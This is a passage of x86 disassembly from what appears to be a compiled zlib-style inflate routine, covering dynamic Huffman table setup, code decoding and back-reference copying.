   1c295:	cmp    edi,0xe
   1c298:	jae    0x1c2c1
   1c29a:	cmp    DWORD PTR [ebp-0x8],0x0
   1c29e:	je     0x1cb86
   1c2a4:	mov    eax,DWORD PTR [ebp-0x4]
   1c2a7:	movzx  eax,BYTE PTR [eax]
   1c2aa:	dec    DWORD PTR [ebp-0x8]
   1c2ad:	mov    ecx,edi
   1c2af:	shl    eax,cl
   1c2b1:	add    edi,0x8
   1c2b4:	add    ebx,eax
   1c2b6:	inc    DWORD PTR [ebp-0x4]
   1c2b9:	cmp    edi,0xe
   1c2bc:	jb     0x1c29a
   1c2be:	mov    edx,DWORD PTR [ebp+0x8]
   1c2c1:	mov    eax,ebx
   1c2c3:	and    eax,0x1f
   1c2c6:	add    eax,0x101
   1c2cb:	mov    DWORD PTR [esi+0x60],eax
   1c2ce:	shr    ebx,0x5
   1c2d1:	mov    eax,ebx
   1c2d3:	and    eax,0x1f
   1c2d6:	inc    eax
   1c2d7:	shr    ebx,0x5
   1c2da:	mov    DWORD PTR [esi+0x64],eax
   1c2dd:	mov    eax,ebx
   1c2df:	and    eax,0xf
   1c2e2:	add    eax,0x4
   1c2e5:	shr    ebx,0x4
   1c2e8:	sub    edi,0xe
   1c2eb:	cmp    DWORD PTR [esi+0x60],0x11e
   1c2f2:	mov    DWORD PTR [esi+0x5c],eax
   1c2f5:	ja     0x1c309
   1c2f7:	cmp    DWORD PTR [esi+0x64],0x1e
   1c2fb:	ja     0x1c309
   1c2fd:	and    DWORD PTR [esi+0x68],0x0
   1c301:	mov    DWORD PTR [esi],0x10
   1c307:	jmp    0x1c357
   1c309:	mov    DWORD PTR [edx+0x18],0x1ed34
   1c310:	jmp    0x1cb32
   1c315:	cmp    DWORD PTR [ebp-0x8],0x0
   1c319:	je     0x1cb86
   1c31f:	mov    eax,DWORD PTR [ebp-0x4]
   1c322:	movzx  eax,BYTE PTR [eax]
   1c325:	dec    DWORD PTR [ebp-0x8]
   1c328:	mov    ecx,edi
   1c32a:	shl    eax,cl
   1c32c:	add    ebx,eax
   1c32e:	inc    DWORD PTR [ebp-0x4]
   1c331:	add    edi,0x8
   1c334:	cmp    edi,0x3
   1c337:	jb     0x1c315
   1c339:	mov    ecx,DWORD PTR [esi+0x68]
   1c33c:	movzx  ecx,WORD PTR [ecx*2+0x7bd40]
   1c344:	mov    eax,ebx
   1c346:	and    eax,0x7
   1c349:	mov    WORD PTR [esi+ecx*2+0x70],ax
   1c34e:	inc    DWORD PTR [esi+0x68]
   1c351:	shr    ebx,0x3
   1c354:	sub    edi,0x3
   1c357:	mov    eax,DWORD PTR [esi+0x68]
   1c35a:	cmp    eax,DWORD PTR [esi+0x5c]
   1c35d:	jb     0x1c334
   1c35f:	jmp    0x1c376
   1c361:	mov    eax,DWORD PTR [esi+0x68]
   1c364:	movzx  eax,WORD PTR [eax*2+0x7bd40]
   1c36c:	xor    ecx,ecx
   1c36e:	mov    WORD PTR [esi+eax*2+0x70],cx
   1c373:	inc    DWORD PTR [esi+0x68]
   1c376:	cmp    DWORD PTR [esi+0x68],0x13
   1c37a:	jb     0x1c361
   1c37c:	lea    eax,[esi+0x530]
   1c382:	lea    ecx,[esi+0x6c]
   1c385:	mov    DWORD PTR [ecx],eax
   1c387:	mov    DWORD PTR [esi+0x4c],eax
   1c38a:	lea    edx,[esi+0x2f0]
   1c390:	push   edx
   1c391:	lea    eax,[esi+0x54]
   1c394:	push   eax
   1c395:	push   ecx
   1c396:	mov    DWORD PTR [eax],0x7
   1c39c:	push   0x13
   1c39e:	lea    eax,[esi+0x70]
   1c3a1:	push   eax
   1c3a2:	push   0x0
   1c3a4:	call   0x1d142
   1c3a9:	mov    DWORD PTR [ebp-0x24],eax
   1c3ac:	test   eax,eax
   1c3ae:	je     0x1c3bf
   1c3b0:	mov    eax,DWORD PTR [ebp+0x8]
   1c3b3:	mov    DWORD PTR [eax+0x18],0x1ed1a
   1c3ba:	jmp    0x1cb32
   1c3bf:	and    DWORD PTR [esi+0x68],0x0
   1c3c3:	mov    DWORD PTR [esi],0x11
   1c3c9:	jmp    0x1c5c5
   1c3ce:	cmp    DWORD PTR [ebp-0x8],0x0
   1c3d2:	je     0x1cb86
   1c3d8:	mov    eax,DWORD PTR [ebp-0x4]
   1c3db:	movzx  eax,BYTE PTR [eax]
   1c3de:	dec    DWORD PTR [ebp-0x8]
   1c3e1:	mov    ecx,edi
   1c3e3:	shl    eax,cl
   1c3e5:	add    ebx,eax
   1c3e7:	inc    DWORD PTR [ebp-0x4]
   1c3ea:	add    edi,0x8
   1c3ed:	mov    ecx,DWORD PTR [esi+0x54]
   1c3f0:	xor    eax,eax
   1c3f2:	inc    eax
   1c3f3:	shl    eax,cl
   1c3f5:	mov    ecx,DWORD PTR [esi+0x4c]
   1c3f8:	dec    eax
   1c3f9:	and    eax,ebx
   1c3fb:	mov    eax,DWORD PTR [ecx+eax*4]
   1c3fe:	mov    ecx,eax
   1c400:	shr    ecx,0x8
   1c403:	movzx  ecx,cl
   1c406:	mov    DWORD PTR [ebp-0x20],eax
   1c409:	cmp    ecx,edi
   1c40b:	ja     0x1c3ce
   1c40d:	mov    ecx,eax
   1c40f:	shr    ecx,0x10
   1c412:	cmp    cx,0x10
   1c416:	jae    0x1c463
   1c418:	mov    ecx,eax
   1c41a:	shr    ecx,0x8
   1c41d:	movzx  ecx,cl
   1c420:	jmp    0x1c444
   1c422:	cmp    DWORD PTR [ebp-0x8],0x0
   1c426:	je     0x1cb86
   1c42c:	mov    ecx,DWORD PTR [ebp-0x4]
   1c42f:	movzx  edx,BYTE PTR [ecx]
   1c432:	dec    DWORD PTR [ebp-0x8]
   1c435:	mov    ecx,edi
   1c437:	shl    edx,cl
   1c439:	movzx  ecx,ah
   1c43c:	add    ebx,edx
   1c43e:	inc    DWORD PTR [ebp-0x4]
   1c441:	add    edi,0x8
   1c444:	cmp    edi,ecx
   1c446:	jb     0x1c422
   1c448:	movzx  ecx,ah
   1c44b:	mov    eax,DWORD PTR [esi+0x68]
   1c44e:	shr    ebx,cl
   1c450:	sub    edi,ecx
   1c452:	mov    cx,WORD PTR [ebp-0x1e]
   1c456:	mov    WORD PTR [esi+eax*2+0x70],cx
   1c45b:	inc    DWORD PTR [esi+0x68]
   1c45e:	jmp    0x1c5c5
   1c463:	cmp    WORD PTR [ebp-0x1e],0x10
   1c468:	jne    0x1c4c0
   1c46a:	movzx  eax,ah
   1c46d:	jmp    0x1c48e
   1c46f:	cmp    DWORD PTR [ebp-0x8],0x0
   1c473:	je     0x1cb86
   1c479:	mov    ecx,DWORD PTR [ebp-0x4]
   1c47c:	movzx  edx,BYTE PTR [ecx]
   1c47f:	dec    DWORD PTR [ebp-0x8]
   1c482:	mov    ecx,edi
   1c484:	shl    edx,cl
   1c486:	add    ebx,edx
   1c488:	inc    DWORD PTR [ebp-0x4]
   1c48b:	add    edi,0x8
   1c48e:	lea    ecx,[eax+0x2]
   1c491:	cmp    edi,ecx
   1c493:	jb     0x1c46f
   1c495:	mov    ecx,eax
   1c497:	sub    edi,eax
   1c499:	mov    eax,DWORD PTR [esi+0x68]
   1c49c:	shr    ebx,cl
   1c49e:	test   eax,eax
   1c4a0:	je     0x1c5d6
   1c4a6:	movzx  eax,WORD PTR [esi+eax*2+0x6e]
   1c4ab:	mov    DWORD PTR [ebp-0x20],eax
   1c4ae:	mov    eax,ebx
   1c4b0:	and    eax,0x3
   1c4b3:	add    eax,0x3
   1c4b6:	shr    ebx,0x2
   1c4b9:	dec    edi
   1c4ba:	dec    edi
   1c4bb:	jmp    0x1c545
   1c4c0:	cmp    WORD PTR [ebp-0x1e],0x11
   1c4c5:	movzx  edx,ah
   1c4c8:	jne    0x1c524
   1c4ca:	jmp    0x1c4eb
   1c4cc:	cmp    DWORD PTR [ebp-0x8],0x0
   1c4d0:	je     0x1cb86
   1c4d6:	mov    eax,DWORD PTR [ebp-0x4]
   1c4d9:	movzx  eax,BYTE PTR [eax]
   1c4dc:	dec    DWORD PTR [ebp-0x8]
   1c4df:	mov    ecx,edi
   1c4e1:	shl    eax,cl
   1c4e3:	add    ebx,eax
   1c4e5:	inc    DWORD PTR [ebp-0x4]
   1c4e8:	add    edi,0x8
   1c4eb:	lea    eax,[edx+0x3]
   1c4ee:	cmp    edi,eax
   1c4f0:	jb     0x1c4cc
   1c4f2:	mov    ecx,edx
   1c4f4:	shr    ebx,cl
   1c4f6:	push   0xfffffffd
   1c4f8:	mov    eax,ebx
   1c4fa:	and    eax,0x7
   1c4fd:	add    eax,0x3
   1c500:	shr    ebx,0x3
   1c503:	jmp    0x1c53c
   1c505:	cmp    DWORD PTR [ebp-0x8],0x0
   1c509:	je     0x1cb86
   1c50f:	mov    eax,DWORD PTR [ebp-0x4]
   1c512:	movzx  eax,BYTE PTR [eax]
   1c515:	dec    DWORD PTR [ebp-0x8]
   1c518:	mov    ecx,edi
   1c51a:	shl    eax,cl
   1c51c:	add    ebx,eax
   1c51e:	inc    DWORD PTR [ebp-0x4]
   1c521:	add    edi,0x8
   1c524:	lea    eax,[edx+0x7]
   1c527:	cmp    edi,eax
   1c529:	jb     0x1c505
   1c52b:	mov    ecx,edx
   1c52d:	shr    ebx,cl
   1c52f:	push   0xfffffff9
   1c531:	mov    eax,ebx
   1c533:	and    eax,0x7f
   1c536:	add    eax,0xb
   1c539:	shr    ebx,0x7
   1c53c:	and    DWORD PTR [ebp-0x20],0x0
   1c540:	pop    ecx
   1c541:	sub    ecx,edx
   1c543:	add    edi,ecx
   1c545:	mov    ecx,DWORD PTR [esi+0x64]
   1c548:	mov    edx,DWORD PTR [esi+0x68]
   1c54b:	add    ecx,DWORD PTR [esi+0x60]
   1c54e:	add    edx,eax
   1c550:	cmp    edx,ecx
   1c552:	jbe    0x1c5c1
   1c554:	mov    eax,DWORD PTR [ebp+0x8]
   1c557:	mov    DWORD PTR [eax+0x18],0x1ed00
   1c55e:	mov    DWORD PTR [esi],0x1b
   1c564:	cmp    DWORD PTR [esi],0x1b
   1c567:	je     0x1cb38
   1c56d:	lea    eax,[esi+0x530]
   1c573:	lea    ecx,[esi+0x6c]
   1c576:	mov    DWORD PTR [ecx],eax
   1c578:	mov    DWORD PTR [esi+0x4c],eax
   1c57b:	lea    edx,[esi+0x2f0]
   1c581:	push   edx
   1c582:	lea    eax,[esi+0x54]
   1c585:	push   eax
   1c586:	push   ecx
   1c587:	push   DWORD PTR [esi+0x60]
   1c58a:	mov    DWORD PTR [eax],0x9
   1c590:	lea    eax,[esi+0x70]
   1c593:	push   eax
   1c594:	push   0x1
   1c596:	call   0x1d142
   1c59b:	mov    DWORD PTR [ebp-0x24],eax
   1c59e:	test   eax,eax
   1c5a0:	je     0x1c5e5
   1c5a2:	mov    eax,DWORD PTR [ebp+0x8]
   1c5a5:	mov    DWORD PTR [eax+0x18],0x1ece4
   1c5ac:	jmp    0x1cb32
   1c5b1:	mov    ecx,DWORD PTR [esi+0x68]
   1c5b4:	mov    dx,WORD PTR [ebp-0x20]
   1c5b8:	dec    eax
   1c5b9:	mov    WORD PTR [esi+ecx*2+0x70],dx
   1c5be:	inc    DWORD PTR [esi+0x68]
   1c5c1:	test   eax,eax
   1c5c3:	jne    0x1c5b1
   1c5c5:	mov    eax,DWORD PTR [esi+0x64]
   1c5c8:	add    eax,DWORD PTR [esi+0x60]
   1c5cb:	cmp    DWORD PTR [esi+0x68],eax
   1c5ce:	jb     0x1c3ed
   1c5d4:	jmp    0x1c564
   1c5d6:	mov    eax,DWORD PTR [ebp+0x8]
   1c5d9:	mov    DWORD PTR [eax+0x18],0x1ed00
   1c5e0:	jmp    0x1cb32
   1c5e5:	lea    ecx,[esi+0x6c]
   1c5e8:	mov    eax,DWORD PTR [ecx]
   1c5ea:	mov    DWORD PTR [esi+0x50],eax
   1c5ed:	lea    edx,[esi+0x2f0]
   1c5f3:	push   edx
   1c5f4:	lea    eax,[esi+0x58]
   1c5f7:	push   eax
   1c5f8:	push   ecx
   1c5f9:	push   DWORD PTR [esi+0x64]
   1c5fc:	mov    DWORD PTR [eax],0x6
   1c602:	mov    eax,DWORD PTR [esi+0x60]
   1c605:	lea    eax,[esi+eax*2+0x70]
   1c609:	push   eax
   1c60a:	push   0x2
   1c60c:	call   0x1d142
   1c611:	mov    DWORD PTR [ebp-0x24],eax
   1c614:	test   eax,eax
   1c616:	je     0x1c627
   1c618:	mov    eax,DWORD PTR [ebp+0x8]
   1c61b:	mov    DWORD PTR [eax+0x18],0x1ecce
   1c622:	jmp    0x1cb32
   1c627:	mov    DWORD PTR [esi],0x12
   1c62d:	cmp    DWORD PTR [ebp-0x8],0x6
   1c631:	jb     0x1c68a
   1c633:	cmp    DWORD PTR [ebp-0x14],0x102
   1c63a:	jb     0x1c68a
   1c63c:	mov    eax,DWORD PTR [ebp+0x8]
   1c63f:	mov    ecx,DWORD PTR [ebp-0x18]
   1c642:	push   DWORD PTR [ebp-0x1c]
   1c645:	mov    DWORD PTR [eax+0xc],ecx
   1c648:	mov    ecx,DWORD PTR [ebp-0x14]
   1c64b:	mov    DWORD PTR [eax+0x10],ecx
   1c64e:	mov    ecx,DWORD PTR [ebp-0x4]
   1c651:	mov    DWORD PTR [eax],ecx
   1c653:	mov    ecx,DWORD PTR [ebp-0x8]
   1c656:	mov    DWORD PTR [eax+0x4],ecx
   1c659:	push   eax
   1c65a:	mov    DWORD PTR [esi+0x38],ebx
   1c65d:	mov    DWORD PTR [esi+0x3c],edi
   1c660:	call   0x1cd5c
   1c665:	mov    eax,DWORD PTR [ebp+0x8]
   1c668:	mov    ecx,DWORD PTR [eax+0xc]
   1c66b:	mov    ebx,DWORD PTR [esi+0x38]
   1c66e:	mov    edi,DWORD PTR [esi+0x3c]
   1c671:	mov    DWORD PTR [ebp-0x18],ecx
   1c674:	mov    ecx,DWORD PTR [eax+0x10]
   1c677:	mov    DWORD PTR [ebp-0x14],ecx
   1c67a:	mov    ecx,DWORD PTR [eax]
   1c67c:	mov    eax,DWORD PTR [eax+0x4]
   1c67f:	mov    DWORD PTR [ebp-0x4],ecx
   1c682:	mov    DWORD PTR [ebp-0x8],eax
   1c685:	jmp    0x1cb38
   1c68a:	mov    ecx,DWORD PTR [esi+0x54]
   1c68d:	mov    eax,DWORD PTR [esi+0x4c]
   1c690:	xor    edx,edx
   1c692:	inc    edx
   1c693:	shl    edx,cl
   1c695:	dec    edx
   1c696:	and    edx,ebx
   1c698:	mov    eax,DWORD PTR [eax+edx*4]
   1c69b:	jmp    0x1c6cd
   1c69d:	cmp    DWORD PTR [ebp-0x8],0x0
   1c6a1:	je     0x1cb86
   1c6a7:	mov    eax,DWORD PTR [ebp-0x4]
   1c6aa:	movzx  eax,BYTE PTR [eax]
   1c6ad:	dec    DWORD PTR [ebp-0x8]
   1c6b0:	mov    ecx,edi
   1c6b2:	shl    eax,cl
   1c6b4:	mov    ecx,DWORD PTR [esi+0x54]
   1c6b7:	add    edi,0x8
   1c6ba:	add    ebx,eax
   1c6bc:	inc    DWORD PTR [ebp-0x4]
   1c6bf:	xor    eax,eax
   1c6c1:	inc    eax
   1c6c2:	shl    eax,cl
   1c6c4:	mov    ecx,DWORD PTR [esi+0x4c]
   1c6c7:	dec    eax
   1c6c8:	and    eax,ebx
   1c6ca:	mov    eax,DWORD PTR [ecx+eax*4]
   1c6cd:	mov    ecx,eax
   1c6cf:	shr    ecx,0x8
   1c6d2:	movzx  ecx,cl
   1c6d5:	cmp    ecx,edi
   1c6d7:	ja     0x1c69d
   1c6d9:	test   al,al
   1c6db:	je     0x1c774
   1c6e1:	test   al,0xf0
   1c6e3:	jne    0x1c774
   1c6e9:	mov    DWORD PTR [ebp-0xc],eax
   1c6ec:	shr    DWORD PTR [ebp-0xc],0x8
   1c6f0:	movzx  edx,BYTE PTR [ebp-0xc]
   1c6f4:	mov    DWORD PTR [ebp-0x28],edx
   1c6f7:	movzx  ecx,al
   1c6fa:	add    ecx,edx
   1c6fc:	xor    edx,edx
   1c6fe:	inc    edx
   1c6ff:	shl    edx,cl
   1c701:	mov    ecx,DWORD PTR [ebp-0x28]
   1c704:	mov    DWORD PTR [ebp-0x20],eax
   1c707:	shr    eax,0x10
   1c70a:	dec    edx
   1c70b:	and    edx,ebx
   1c70d:	shr    edx,cl
   1c70f:	add    edx,eax
   1c711:	mov    eax,DWORD PTR [esi+0x4c]
   1c714:	mov    eax,DWORD PTR [eax+edx*4]
   1c717:	movzx  edx,BYTE PTR [ebp-0xc]
   1c71b:	jmp    0x1c75e
   1c71d:	cmp    DWORD PTR [ebp-0x8],0x0
   1c721:	je     0x1cb86
   1c727:	mov    eax,DWORD PTR [ebp-0x4]
   1c72a:	movzx  eax,BYTE PTR [eax]
   1c72d:	movzx  edx,BYTE PTR [ebp-0x1f]
   1c731:	dec    DWORD PTR [ebp-0x8]
   1c734:	mov    ecx,edi
   1c736:	shl    eax,cl
   1c738:	movzx  ecx,BYTE PTR [ebp-0x20]
   1c73c:	add    ebx,eax
   1c73e:	inc    DWORD PTR [ebp-0x4]
   1c741:	xor    eax,eax
   1c743:	add    ecx,edx
   1c745:	inc    eax
   1c746:	shl    eax,cl
   1c748:	add    edi,0x8
   1c74b:	mov    ecx,edx
   1c74d:	dec    eax
   1c74e:	and    eax,ebx
   1c750:	shr    eax,cl
   1c752:	movzx  ecx,WORD PTR [ebp-0x1e]
   1c756:	add    eax,ecx
   1c758:	mov    ecx,DWORD PTR [esi+0x4c]
   1c75b:	mov    eax,DWORD PTR [ecx+eax*4]
   1c75e:	mov    ecx,eax
   1c760:	shr    ecx,0x8
   1c763:	movzx  ecx,cl
   1c766:	add    ecx,edx
   1c768:	cmp    ecx,edi
   1c76a:	ja     0x1c71d
   1c76c:	movzx  ecx,BYTE PTR [ebp-0x1f]
   1c770:	shr    ebx,cl
   1c772:	sub    edi,ecx
   1c774:	mov    ecx,eax
   1c776:	shr    ecx,0x8
   1c779:	movzx  ecx,cl
   1c77c:	shr    ebx,cl
   1c77e:	sub    edi,ecx
   1c780:	mov    ecx,eax
   1c782:	shr    ecx,0x10
   1c785:	mov    DWORD PTR [esi+0x40],ecx
   1c788:	test   al,al
   1c78a:	jne    0x1c797
   1c78c:	mov    DWORD PTR [esi],0x17
   1c792:	jmp    0x1cb38
   1c797:	test   al,0x20
   1c799:	je     0x1c7a6
   1c79b:	mov    DWORD PTR [esi],0xb
   1c7a1:	jmp    0x1cb38
   1c7a6:	test   al,0x40
   1c7a8:	je     0x1c7b9
   1c7aa:	mov    eax,DWORD PTR [ebp+0x8]
   1c7ad:	mov    DWORD PTR [eax+0x18],0x1ecb2
   1c7b4:	jmp    0x1cb32
   1c7b9:	movzx  eax,al
   1c7bc:	and    eax,0xf
   1c7bf:	mov    DWORD PTR [esi+0x48],eax
   1c7c2:	mov    DWORD PTR [esi],0x13
   1c7c8:	mov    eax,DWORD PTR [esi+0x48]
   1c7cb:	test   eax,eax
   1c7cd:	je     0x1c808
   1c7cf:	cmp    edi,eax
   1c7d1:	jae    0x1c7f7
   1c7d3:	cmp    DWORD PTR [ebp-0x8],0x0
   1c7d7:	je     0x1cb86
   1c7dd:	mov    ecx,DWORD PTR [ebp-0x4]
   1c7e0:	movzx  edx,BYTE PTR [ecx]
   1c7e3:	dec    DWORD PTR [ebp-0x8]
   1c7e6:	mov    ecx,edi
   1c7e8:	shl    edx,cl
   1c7ea:	add    edi,0x8
   1c7ed:	add    ebx,edx
   1c7ef:	inc    DWORD PTR [ebp-0x4]
   1c7f2:	cmp    edi,DWORD PTR [esi+0x48]
   1c7f5:	jb     0x1c7d3
   1c7f7:	xor    edx,edx
   1c7f9:	inc    edx
   1c7fa:	mov    ecx,eax
   1c7fc:	shl    edx,cl
   1c7fe:	dec    edx
   1c7ff:	and    edx,ebx
   1c801:	add    DWORD PTR [esi+0x40],edx
   1c804:	shr    ebx,cl
   1c806:	sub    edi,eax
   1c808:	mov    DWORD PTR [esi],0x14
   1c80e:	mov    ecx,DWORD PTR [esi+0x58]
   1c811:	mov    eax,DWORD PTR [esi+0x50]
   1c814:	xor    edx,edx
   1c816:	inc    edx
   1c817:	shl    edx,cl
   1c819:	dec    edx
   1c81a:	and    edx,ebx
   1c81c:	mov    eax,DWORD PTR [eax+edx*4]
   1c81f:	jmp    0x1c851
   1c821:	cmp    DWORD PTR [ebp-0x8],0x0
   1c825:	je     0x1cb86
   1c82b:	mov    eax,DWORD PTR [ebp-0x4]
   1c82e:	movzx  eax,BYTE PTR [eax]
   1c831:	dec    DWORD PTR [ebp-0x8]
   1c834:	mov    ecx,edi
   1c836:	shl    eax,cl
   1c838:	mov    ecx,DWORD PTR [esi+0x58]
   1c83b:	add    edi,0x8
   1c83e:	add    ebx,eax
   1c840:	inc    DWORD PTR [ebp-0x4]
   1c843:	xor    eax,eax
   1c845:	inc    eax
   1c846:	shl    eax,cl
   1c848:	mov    ecx,DWORD PTR [esi+0x50]
   1c84b:	dec    eax
   1c84c:	and    eax,ebx
   1c84e:	mov    eax,DWORD PTR [ecx+eax*4]
   1c851:	mov    ecx,eax
   1c853:	shr    ecx,0x8
   1c856:	movzx  ecx,cl
   1c859:	cmp    ecx,edi
   1c85b:	ja     0x1c821
   1c85d:	test   al,0xf0
   1c85f:	jne    0x1c8f0
   1c865:	mov    DWORD PTR [ebp-0xc],eax
   1c868:	shr    DWORD PTR [ebp-0xc],0x8
   1c86c:	movzx  edx,BYTE PTR [ebp-0xc]
   1c870:	mov    DWORD PTR [ebp-0x28],edx
   1c873:	movzx  ecx,al
   1c876:	add    ecx,edx
   1c878:	xor    edx,edx
   1c87a:	inc    edx
   1c87b:	shl    edx,cl
   1c87d:	mov    ecx,DWORD PTR [ebp-0x28]
   1c880:	mov    DWORD PTR [ebp-0x20],eax
   1c883:	shr    eax,0x10
   1c886:	dec    edx
   1c887:	and    edx,ebx
   1c889:	shr    edx,cl
   1c88b:	add    edx,eax
   1c88d:	mov    eax,DWORD PTR [esi+0x50]
   1c890:	mov    eax,DWORD PTR [eax+edx*4]
   1c893:	movzx  edx,BYTE PTR [ebp-0xc]
   1c897:	jmp    0x1c8da
   1c899:	cmp    DWORD PTR [ebp-0x8],0x0
   1c89d:	je     0x1cb86
   1c8a3:	mov    eax,DWORD PTR [ebp-0x4]
   1c8a6:	movzx  eax,BYTE PTR [eax]
   1c8a9:	movzx  edx,BYTE PTR [ebp-0x1f]
   1c8ad:	dec    DWORD PTR [ebp-0x8]
   1c8b0:	mov    ecx,edi
   1c8b2:	shl    eax,cl
   1c8b4:	movzx  ecx,BYTE PTR [ebp-0x20]
   1c8b8:	add    ebx,eax
   1c8ba:	inc    DWORD PTR [ebp-0x4]
   1c8bd:	xor    eax,eax
   1c8bf:	add    ecx,edx
   1c8c1:	inc    eax
   1c8c2:	shl    eax,cl
   1c8c4:	add    edi,0x8
   1c8c7:	mov    ecx,edx
   1c8c9:	dec    eax
   1c8ca:	and    eax,ebx
   1c8cc:	shr    eax,cl
   1c8ce:	movzx  ecx,WORD PTR [ebp-0x1e]
   1c8d2:	add    eax,ecx
   1c8d4:	mov    ecx,DWORD PTR [esi+0x50]
   1c8d7:	mov    eax,DWORD PTR [ecx+eax*4]
   1c8da:	mov    ecx,eax
   1c8dc:	shr    ecx,0x8
   1c8df:	movzx  ecx,cl
   1c8e2:	add    ecx,edx
   1c8e4:	cmp    ecx,edi
   1c8e6:	ja     0x1c899
   1c8e8:	movzx  ecx,BYTE PTR [ebp-0x1f]
   1c8ec:	shr    ebx,cl
   1c8ee:	sub    edi,ecx
   1c8f0:	mov    ecx,eax
   1c8f2:	shr    ecx,0x8
   1c8f5:	movzx  ecx,cl
   1c8f8:	shr    ebx,cl
   1c8fa:	sub    edi,ecx
   1c8fc:	test   al,0x40
   1c8fe:	je     0x1c90f
   1c900:	mov    eax,DWORD PTR [ebp+0x8]
   1c903:	mov    DWORD PTR [eax+0x18],0x1ec9c
   1c90a:	jmp    0x1cb32
   1c90f:	mov    edx,DWORD PTR [ebp+0x8]
   1c912:	mov    ecx,eax
   1c914:	movzx  eax,al
   1c917:	shr    ecx,0x10
   1c91a:	and    eax,0xf
   1c91d:	mov    DWORD PTR [esi+0x44],ecx
   1c920:	mov    DWORD PTR [esi+0x48],eax
   1c923:	mov    DWORD PTR [esi],0x15
   1c929:	mov    eax,DWORD PTR [esi+0x48]
   1c92c:	test   eax,eax
   1c92e:	je     0x1c96d
   1c930:	cmp    edi,eax
   1c932:	jae    0x1c95b
   1c934:	cmp    DWORD PTR [ebp-0x8],0x0
   1c938:	je     0x1cb86
   1c93e:	mov    eax,DWORD PTR [ebp-0x4]
   1c941:	movzx  eax,BYTE PTR [eax]
   1c944:	dec    DWORD PTR [ebp-0x8]
   1c947:	mov    ecx,edi
   1c949:	shl    eax,cl
   1c94b:	add    edi,0x8
   1c94e:	add    ebx,eax
   1c950:	inc    DWORD PTR [ebp-0x4]
   1c953:	cmp    edi,DWORD PTR [esi+0x48]
   1c956:	jb     0x1c934
   1c958:	mov    edx,DWORD PTR [ebp+0x8]
   1c95b:	mov    ecx,DWORD PTR [esi+0x48]
   1c95e:	xor    eax,eax
   1c960:	inc    eax
   1c961:	shl    eax,cl
   1c963:	dec    eax
   1c964:	and    eax,ebx
   1c966:	add    DWORD PTR [esi+0x44],eax
   1c969:	shr    ebx,cl
   1c96b:	sub    edi,ecx
   1c96d:	mov    eax,DWORD PTR [esi+0x2c]
   1c970:	sub    eax,DWORD PTR [ebp-0x14]
   1c973:	add    eax,DWORD PTR [ebp-0x1c]
   1c976:	cmp    DWORD PTR [esi+0x44],eax
   1c979:	jbe    0x1c987
   1c97b:	mov    DWORD PTR [edx+0x18],0x1ec7e
   1c982:	jmp    0x1cb32
   1c987:	mov    DWORD PTR [esi],0x16
   1c98d:	cmp    DWORD PTR [ebp-0x14],0x0
   1c991:	je     0x1cb86
   1c997:	mov    eax,DWORD PTR [ebp-0x1c]
   1c99a:	sub    eax,DWORD PTR [ebp-0x14]
   1c99d:	mov    ecx,DWORD PTR [esi+0x44]
   1c9a0:	cmp    ecx,eax
   1c9a2:	jbe    0x1c9d1
   1c9a4:	sub    ecx,eax
   1c9a6:	mov    eax,DWORD PTR [esi+0x34]
   1c9a9:	mov    DWORD PTR [ebp-0xc],ecx
   1c9ac:	mov    ecx,DWORD PTR [esi+0x30]
   1c9af:	cmp    DWORD PTR [ebp-0xc],ecx
   1c9b2:	jbe    0x1c9bf
   1c9b4:	add    eax,DWORD PTR [esi+0x28]
   1c9b7:	sub    DWORD PTR [ebp-0xc],ecx
   1c9ba:	sub    eax,DWORD PTR [ebp-0xc]
   1c9bd:	jmp    0x1c9c4
   1c9bf:	sub    eax,DWORD PTR [ebp-0xc]
   1c9c2:	add    eax,ecx
   1c9c4:	mov    ecx,DWORD PTR [esi+0x40]
   1c9c7:	mov    DWORD PTR [ebp-0x28],ecx
   1c9ca:	cmp    DWORD PTR [ebp-0xc],ecx
   1c9cd:	jbe    0x1c9df
   1c9cf:	jmp    0x1c9dc
   1c9d1:	mov    eax,DWORD PTR [ebp-0x18]
   1c9d4:	sub    eax,ecx
   1c9d6:	mov    ecx,DWORD PTR [esi+0x40]
   1c9d9:	mov    DWORD PTR [ebp-0x28],ecx
   1c9dc:	mov    DWORD PTR [ebp-0xc],ecx
   1c9df:	mov    ecx,DWORD PTR [ebp-0x14]
   1c9e2:	cmp    DWORD PTR [ebp-0xc],ecx
   1c9e5:	jbe    0x1c9ea
   1c9e7:	mov    DWORD PTR [ebp-0xc],ecx
   1c9ea:	sub    ecx,DWORD PTR [ebp-0xc]
   1c9ed:	mov    DWORD PTR [ebp-0x14],ecx
   1c9f0:	mov    ecx,DWORD PTR [ebp-0x28]
   1c9f3:	sub    ecx,DWORD PTR [ebp-0xc]
   1c9f6:	mov    DWORD PTR [esi+0x40],ecx
   1c9f9:	mov    edx,DWORD PTR [ebp-0x18]
   1c9fc:	mov    cl,BYTE PTR [eax]
   1c9fe:	inc    DWORD PTR [ebp-0x18]
   1ca01:	inc    eax
   1ca02:	dec    DWORD PTR [ebp-0xc]
   1ca05:	mov    BYTE PTR [edx],cl
   1ca07:	jne    0x1c9f9
   1ca09:	cmp    DWORD PTR [esi+0x40],0x0
   1ca0d:	jne    0x1cb38
   1ca13:	jmp    0x1ca2d
   1ca15:	cmp    DWORD PTR [ebp-0x14],0x0
   1ca19:	je     0x1cb86
   1ca1f:	mov    ecx,DWORD PTR [ebp-0x18]
   1ca22:	mov    al,BYTE PTR [esi+0x40]
   1ca25:	inc    DWORD PTR [ebp-0x18]
   1ca28:	dec    DWORD PTR [ebp-0x14]
   1ca2b:	mov    BYTE PTR [ecx],al
   1ca2d:	mov    DWORD PTR [esi],0x12
   1ca33:	jmp    0x1cb38
   1ca38:	cmp    DWORD PTR [esi+0x8],0x0
   1ca3c:	je     0x1caec
   1ca42:	cmp    edi,0x20
   1ca45:	jae    0x1ca6e
   1ca47:	cmp    DWORD PTR [ebp-0x8],0x0
   1ca4b:	je     0x1cb86
   1ca51:	mov    eax,DWORD PTR [ebp-0x4]
   1ca54:	movzx  eax,BYTE PTR [eax]
   1ca57:	dec    DWORD PTR [ebp-0x8]
   1ca5a:	mov    ecx,edi
   1ca5c:	shl    eax,cl
   1ca5e:	add    edi,0x8
   1ca61:	add    ebx,eax
   1ca63:	inc    DWORD PTR [ebp-0x4]
   1ca66:	cmp    edi,0x20
   1ca69:	jb     0x1ca47
   1ca6b:	mov    edx,DWORD PTR [ebp+0x8]
   1ca6e:	mov    eax,DWORD PTR [ebp-0x1c]
   1ca71:	sub    eax,DWORD PTR [ebp-0x14]
   1ca74:	add    DWORD PTR [edx+0x14],eax
   1ca77:	add    DWORD PTR [esi+0x1c],eax
